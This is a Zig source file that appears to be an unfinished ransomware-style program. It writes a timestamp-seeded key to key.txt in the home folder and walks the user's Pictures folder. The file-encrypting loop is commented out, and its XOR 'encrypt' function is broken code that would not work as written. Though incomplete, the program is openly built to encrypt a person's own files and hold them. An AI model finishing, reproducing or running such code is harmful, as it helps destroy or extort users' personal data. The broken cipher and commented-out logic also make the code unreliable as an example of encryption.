const std = @import("std");
const os = std.os;
const fs = std.fs;
const mem = std.mem;
const rand = std.rand;
const algo = std.crypto.aead.chacha_poly.XChaCha20Poly1305;
const kf = @import("known-folders");
const KnownFolder = kf.KnownFolder;

const keyFileName = "key.txt";
const idc = fs.Dir.OpenDirOptions{};

const fails = error{
    NoFolder,
};

pub fn main() anyerror!void {
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();

    const alloc = arena.allocator();

    var homeFolder = try kf.open(alloc, KnownFolder.home, idc) orelse {
        std.debug.print("bruh", .{});
        return fails.NoFolder;
    };
    defer homeFolder.close();

    var targetPath = try kf.getPath(alloc, KnownFolder.pictures) orelse {
        std.debug.print("bruh v2", .{});
        return fails.NoFolder;
    };

    // Generate a random key
    var key: [32]u8 = undefined;
    var prng = initRng();
    prng.fill(&key);

    // Write the key to the key file
    try homeFolder.writeFile(keyFileName, &key);

    // Encrypt files in the folder
    var targetFolder = try fs.openIterableDirAbsolute(targetPath, idc);
    var it = targetFolder.iterate();
    while (try it.next()) |entry| {
        const entryName = entry.name;
        // if (entry.isDir()) continue;

        std.debug.print("Found: {s}\n", .{entryName});

        // const filePath = try std.build.pathAppend(null, targetPath, entryName);
        // const encryptedFilePath = try std.build.pathAppend(null, targetPath, entryName ++ ".encrypted");
        //
        // const file = try os.openFile(filePath, .{ .read = true });
        // defer file.close();
        //
        // const encryptedFile = try os.create(encryptedFilePath);
        // defer encryptedFile.close();
        //
        // var buffer: [4096]u8 = undefined;
        // while (true) |readResult| {
        //     _ = readResult;
        //     const bytesRead = try file.read(buffer[0..]);
        //     if (bytesRead == 0) break;
        //
        //     const encryptedBytes = encrypt(buffer[0..bytesRead], key);
        //     try encryptedFile.writeAll(encryptedBytes[0..]);
        // }
    }
}

fn initRng() rand.ChaCha {
    const timeArr: [8]u8 = @bitCast(std.time.milliTimestamp());
    var seed: [32]u8 = undefined;

    inline for (0..4) |i| {
        @memcpy(seed[(i * 8) .. (i * 8) + 8], timeArr[0..]);
    }

    return rand.ChaCha.init(seed);
}

fn encrypt(data: []const u8, key: []const u8) []u8 {
    const length = data.len;
    var encrypted: [length]u8 = undefined;

    for (encrypted, data, key) |enc, dat, k| {
        enc.* = dat ^ k;
    }

    return encrypted;
}
